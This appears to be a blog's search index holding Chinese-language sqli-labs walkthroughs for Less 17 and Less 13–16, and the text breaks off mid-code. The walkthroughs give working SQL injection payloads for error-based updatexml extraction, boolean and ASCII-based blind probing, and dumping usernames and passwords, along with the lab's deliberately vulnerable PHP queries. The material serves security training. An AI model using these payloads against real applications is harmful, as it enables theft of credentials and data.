<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sqli-labs：Less 17</title>
      <link href="/posts/Less%2017/"/>
      <url>/posts/Less%2017/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="sqli-labs：Less-17"><a href="#sqli-labs：Less-17" class="headerlink" title="sqli-labs：Less 17"></a>sqli-labs：Less 17</h2><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>我们先按照这个网页的功能走一遍，目测是更改密码的页面，输入用户名之后用新密码覆盖旧密码。</p><p>切换到 Less 11 验证一下，可以看到此时 admin 用户的密码已经被我们所修改。</p><p>接下来判断注入类型，使用单引号闭合构造恒真条件，网页回显密码修改失败。测试一下所有的注入，发现这些注入网页都回显改密失败。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; OR 1 = 1#</span><br><span class="line">a&#x27;) OR 1 = 1#</span><br><span class="line">a&#x27;)) OR 1 = 1#</span><br><span class="line">a&quot; OR 1 = 1#</span><br><span class="line">a&quot;) OR 1 = 1#</span><br><span class="line">a&quot;)) OR 1 = 1#</span><br></pre></td></tr></table></figure><p>抓包得知网页需要利用 POST 方法提交的参数格式如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>接下来对新密码字段进行闭合测试，使用单引号闭合以及以下几种注入，仍然全部失败。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&amp;passwd=a&#x27;#&amp;submit=Submit</span><br><span class="line">uname=a&amp;passwd=a&#x27;)#&amp;submit=Submit</span><br><span class="line">uname=a&amp;passwd=a&#x27;))#&amp;submit=Submit</span><br><span class="line">uname=a&amp;passwd=a&quot;#&amp;submit=Submit</span><br><span class="line">uname=a&amp;passwd=a&quot;)#&amp;submit=Submit</span><br><span class="line">uname=a&amp;passwd=a&quot;))#&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>我们切换下思路，之前我们的用户名字段都是随便输入的，现在我们写上一个已知的用户名 admin 再次注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=a&#x27;&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>网页回显改密码成功，并且报了一个语法错误，说明 passwd 使用单引号进行闭合。同时我们可以推测这个关卡有两次查询，第一次是根据 uname 参数进行查询，判断要改密码的用户是否存在。第二次查询时根据要改密码的用户，把 passwd 参数覆盖原密码，这里在第二次查询有注入点。</p><h3 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h3><p>我们将使用 <code>updatexml() 报错注入</code> ，该函数用于改变 XML 文档中符合条件的节点的值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(XML_document, XPath_string, new_value); </span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">XML_document</td><td align="center">String，XML 文档对象的名称</td></tr><tr><td align="center">XPath_string</td><td align="center">XPath 格式的字符串</td></tr><tr><td align="center">new_value</td><td align="center">String，用于替换查找到的符合条件的数据</td></tr></tbody></table><p>其中参数 <code>XPath_string</code> 需要是 <code>/xxx/xxx/…</code> 的格式，进行查询时将会按照这个参数进行操作。注意如果 <code>XPath_string</code> 是个错误的路径，但是该路径符合 Xpath 的规范就不会报错。反之 <code>XPath_string</code> 的格式错误时就会触发报错，我们要利用的就是这一点，通过 <code>updatexml()</code> 函数的报错回显我们需要的信息。<br>为了更好理解 <code>updatexml()</code> 报错注入，我们利用<code>updatexml()</code>函数获取当前使用的MySQL版本。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&#x27; OR updatexml(1,concat(&quot;!&quot;,version()),2)#&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>为什么可以返回 MySQL版本？因为我们使用单引号闭合了 passwd 参数所在的 SQL语句的前面的部分，使用or连接的 updatexml() 函数就会被执行。updatexml() 函数会在 “concat(“!”,version())” 路径下查找 “1”，若查找成功就将其替换为 “2”。不过我们使用 concat() 函数在 verion() 的返回值前加了个 “!”，使得 XPath_string 的内容不符合 Xpath 的<code>/xxx/xxx/…</code>规范从而触发报错，报错回显的内容就是感叹号带上 verison() 函数的返回值。</p><h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>爆库名，利用 updatexml() 报错回显数据库名。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&#x27; or updatexml(1,concat(&quot;!&quot;,database()),2)#&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408211140677.png" alt="image-20240821114044734"></p><p>爆表名，XPath_string 参数可以使用一个 SELECT 查询结果，使用 group_concat() 函数聚合。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&#x27; OR updatexml(1,concat(&quot;!&quot;,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#x27;security&#x27;)),2)#&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408211142597.png" alt="image-20240821114203323"></p><p>爆字段名，继续使用 updatexml() 报错注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&#x27; OR updatexml(1,concat(&quot;!&quot;,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = &#x27;security&#x27; AND table_name = &#x27;users&#x27;)),2)#&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408211142175.png" alt="image-20240821114247263"></p><h3 id="获取目标信息"><a href="#获取目标信息" class="headerlink" title="获取目标信息"></a>获取目标信息</h3><p>使用报错注入回显用户名和密码，发现网页回显 “You can’t specify target table ‘users’ for update in FROM clause”。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&#x27; OR updatexml(1,concat(&#x27;!&#x27;,(SELECT group_concat(&#x27;:&#x27;,username,password) FROM users)),1)# &amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408211143360.png" alt="image-20240821114358271"></p><p>这里我们无法直接从 users 表拿数据，我们可以先用一个表暂存从 users 表中取出所有数据的查询，然后再从这个暂存的表中取出数据。构造出的 payload 如下，思路就是利用一个查询从另一个查询中取出数据，以此绕过表的限制。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&#x27; OR (updatexml(1,concat(&#x27;!&#x27;,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1))#submit=submit</span><br></pre></td></tr></table></figure><p>通过修改 LIMIT 子句的返回行数，就能取出其他行的查询结果。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&#x27; OR (updatexml(1,concat(&#x27;!&#x27;,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 1,1)),1))#submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408211146273.png" alt="image-20240821114607251"></p><h3 id="关卡SQL语句"><a href="#关卡SQL语句" class="headerlink" title="关卡SQL语句"></a>关卡SQL语句</h3><h4 id="SQL查询"><a href="#SQL查询" class="headerlink" title="SQL查询"></a>SQL查询</h4><p>源码如下，服务器先对用户名进行查询，若用户名存在则用传进的参数 passwd 覆盖掉原来的密码。也就是说只有当第一个 SELECT 执行成功时，UPDATE 语句才会被执行。为什么我们无法对 SELECT 语句进行注入？注意到 SELECT 是针对 uname 参数进行查询，但是当 uname 参数被传入时进入了 check_input() 函数，从而怀疑 check_input() 函数对传入的字符串进行了过滤。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span> = <span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;</span></span><br><span class="line">      <span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  </span><br><span class="line">      <span class="comment">//echo &#x27;Your Login name:&#x27;. $row1;</span></span><br><span class="line">      <span class="variable">$update</span> = <span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">      mysql_query(<span class="variable">$update</span>);</span><br><span class="line">      <span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (mysql_error())</span><br><span class="line">      &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//echo &quot; You password has been successfully updated &quot; ;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">      <span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      <span class="comment">//echo &quot;Bug off you Silly Dumb hacker&quot;;</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="check-input-函数"><a href="#check-input-函数" class="headerlink" title="check_input()函数"></a>check_input()函数</h4><p>源码如下，可以明显看到该函数对 uname 参数进行了强效的过滤。首先函数使用了 <code>substr()</code> 函数截取 uname 的前 15 位字符，限制了 uname 的输入长度。接着使用 <code>get_magic_quotes_gpc()</code> 函数判断 <code>magic_quotes_gpc</code> 是否是开启的，若是开启的就使用 <code>stripslashes()</code> 函数对单引号、双引号、反斜杠与 NULL等危险的字符进行转义。接着使用 <code>ctype_digit()</code> 函数判断 uname 是否为数字，若不是数字就使用 <code>mysql_real_escape_string()</code> 函数对字符进行转义，否则就使用 <code>intval()</code> 函数把数字转换为整型。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">      &#123;</span><br><span class="line">            <span class="comment">// truncation (see comments)</span></span><br><span class="line">            <span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">      <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">      &#123;</span><br><span class="line">            <span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// Quote if not a number</span></span><br><span class="line">      <span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">      &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">            <span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此可见对 SELECT 语句的过滤是很强的，我们把通过 uname 参数注入 “a’ OR 1 = 1#” 经过滤处理的 SELECT 语句输出来看看。可以看到经过转义，我们无法从该语句进行注入。</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408211151144.png" alt="img"></p><p>但是 UPDATE 语句并没有进行过滤，因此当我们可以绕过 SELECT 语句时，就可以通过 UPDATE 进行注入。为了加深理解，我们把注入后闭合的 UPDATE 语句输出来看看。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET password = &#x27;&#x27; OR updatexml(1,concat(&quot;!&quot;,database()),2)#&#x27; WHERE username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408211152375.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs：Less 13~16</title>
      <link href="/posts/Less%2013~16(POST%E6%96%B9%E5%BC%8F%E7%9A%84%E7%9B%B2%E6%B3%A8)/"/>
      <url>/posts/Less%2013~16(POST%E6%96%B9%E5%BC%8F%E7%9A%84%E7%9B%B2%E6%B3%A8)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="sqli-labs：Less-13-16"><a href="#sqli-labs：Less-13-16" class="headerlink" title="sqli-labs：Less 13 ~ 16"></a>sqli-labs：Less 13 ~ 16</h2><p>Less 13~16 都是基于 bool 盲注或时间盲注的关卡，和之前的关卡区别在于此时用 POST 方法传递参数。</p><h3 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h3><p>POST 单引号变形双注入</p><h4 id="判断数据类型"><a href="#判断数据类型" class="headerlink" title="判断数据类型"></a>判断数据类型</h4><p>用户名随便写点东西后用单引号闭合，使用 OR 运算符构造恒真条件，使用 “#” 注释掉后面的内容注入。网页提示登录失败，并返回语法错误的提示信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; or 1 = 1#</span><br></pre></td></tr></table></figure><p>添加一个括号，使用单引号闭合，此时网页提示我们登录成功。因此网页存在字符型注入漏洞，并且使用单引号和括号进行闭合。注意到此时网页并没有返回任何信息，我们需要使用 bool 盲注进行注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) or 1 = 1#</span><br></pre></td></tr></table></figure><p>使用 Brup 抓包，网页是通过 POST 方法提交的参数如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h4 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h4><p>判断表有几列，使用 ORDER BY 子句进行排序看下对几列有效。对第二列对返回的结果排序，网页返回正常。对第 3 列对返回的结果排序，网页返回不知道第 3 列，说明一共有 2 列。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&#x27;) OR 1 = 1 ORDER BY 2#&amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>判断数据库名的长度，网页只会有登录成功或登录失败两种情况，使用 length() 函数结合回显信息判断数据库长度。经过二分法测试，得出数据库长度为 8。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&#x27;) or length((select database())) = 8#&amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>判断数据库名，使用 left(string，num) 函数返回字符串 string 最左边的 num 个字符。首先使用判断数据库名的第一位是否是字符 a。注入之后返回登录失败，说明数据库名第一位不是 a。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&#x27;) OR LEFT((SELECT database()),1) = &#x27;a&#x27;#&amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>使用 brup 抓包，对第一个字符进行爆破，得出数据库第一个字符是 “s”。</p><p>通过相同的方式进行爆破，最后得出数据库名为 “security”。使用同样的方法继续爆破表名、字段名及其剩余信息。</p><h4 id="关卡SQL查询语句"><a href="#关卡SQL查询语句" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span> = <span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;) and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">      <span class="comment">//echo &quot; You Have successfully logged in &quot; ;</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="comment">//echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span></span><br><span class="line">      <span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">      <span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span></span><br><span class="line">      <span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">      <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">      print_r(mysql_error());</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h3><p>POST 单引号变形双注入</p><h4 id="判断数据类型-1"><a href="#判断数据类型-1" class="headerlink" title="判断数据类型"></a>判断数据类型</h4><p>用户名随便写点东西后用单引号闭合，使用 OR 运算符构造恒真条件，使用 “#” 注释掉后面的内容注入。注入以下的内容，统统都显示登录失败且无回显。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; or 1 = 1#</span><br><span class="line">a&#x27;) or 1 = 1#</span><br><span class="line">a&#x27;)) or 1 = 1#</span><br></pre></td></tr></table></figure><p>使用双引号闭合，此时网页提示我们登录成功。因此网页存在双引号进行闭合的字符型注入漏洞，此时网页也没有返回任何信息，我们需要使用 bool 盲注进行注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&quot; or 1 = 1#</span><br></pre></td></tr></table></figure><p>使用 Brup 抓包，网页是通过 POST 方法提交的参数如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h4 id="获取数据库信息-1"><a href="#获取数据库信息-1" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h4><p>判断表有几列，使用 ORDER BY 子句进行排序看下对几列有效。对第二列对返回的结果排序，网页返回正常。对第 3 列对返回的结果排序，网页返回不知道第 3 列，说明一共有 2 列。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&quot; OR 1 = 1 ORDER BY 3#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>得出数据库名的长度，网页只会有登录成功或登录失败 2 种情况，使用 length() 函数结合回显信息得出数据库长度为 8。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&quot; OR LENGTH((SELECT database())) = 8#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>获取数据库名时可以使用 left() 函数，这里使用 substr() 函数截取数据库名的每个字符，然后使用 ASCII() 函数判断这个字符的 ASCII 码值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&quot; OR ASCII(SUBSTR((SELECT database()),1,1))&gt;100#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>使用二分法进行测试，最后得出数据库名的第一个字符 ASCII 码值为 115。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&quot; OR ASCII(SUBSTR((SELECT database()),1,1))=115#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>通过相同的方式进行测试，最后得出数据库名为 “security”。使用同样的方法继续爆出表名、字段名及其剩余信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&quot; OR ASCII(SUBSTR((SELECT database()),2,1))=101#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h4 id="关卡SQL查询语句-1"><a href="#关卡SQL查询语句-1" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="variable">$uname</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span> = <span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><h3 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h3><p>基于 bool 型/时间延迟单引号POST型盲注</p><h4 id="判断数据类型-2"><a href="#判断数据类型-2" class="headerlink" title="判断数据类型"></a>判断数据类型</h4><p>用户名随便写点东西后用单引号闭合，使用 OR 运算符构造恒真条件，使用 “#” 注释掉后面的内容注入。网页提示登录失败，但是并未返回任何信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1 = 1#</span><br></pre></td></tr></table></figure><p>尝试使用括号制造报错信息，但是网页仍然没有回显。说明此处只能通过登录成功或失败来判断注入情况，使用 bool 盲注或者时间盲注都行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) or 1 = 1#</span><br></pre></td></tr></table></figure><p>使用 Brup 抓包，网页是通过 POST 方法提交的参数如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h4 id="获取数据库信息-2"><a href="#获取数据库信息-2" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h4><p>通关 Less 15 采用上述两种方式都行，也可以使用时间盲注。判断表有几列，使用 ORDER BY 子句对第二列对返回的结果排序，网页返回正常。对第 3 列对返回的结果排序，网页返回不知道第 3 列，说明一共有 2 列。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&#x27;) OR 1 = 1 ORDER BY 2#&amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>判断数据库名的长度，使用 length() 函数得出数据库长度为 8。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&#x27;) OR LENGTH((SELECT database())) = 8#&amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>判断数据库名，使用 substr() 函数截取数据库名的每个字符，然后使用 ASCII() 函数判断这个字符的 ASCII 码值。使用二分法进行测试，最后得出数据库名的第一个字符 ASCII 码值为 115。通过相同的方式进行测试，最后得出数据库名为 “security”。使用同样的方法继续爆出表名、字段名及其剩余信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=a&#x27; OR ASCII(SUBSTR((SELECT database()),1,1))=115#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h4 id="关卡SQL查询语句-2"><a href="#关卡SQL查询语句-2" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span> = <span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;</span></span><br><span class="line">  </span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">      <span class="comment">//echo &quot; You Have successfully logged in\n\n &quot; ;</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span 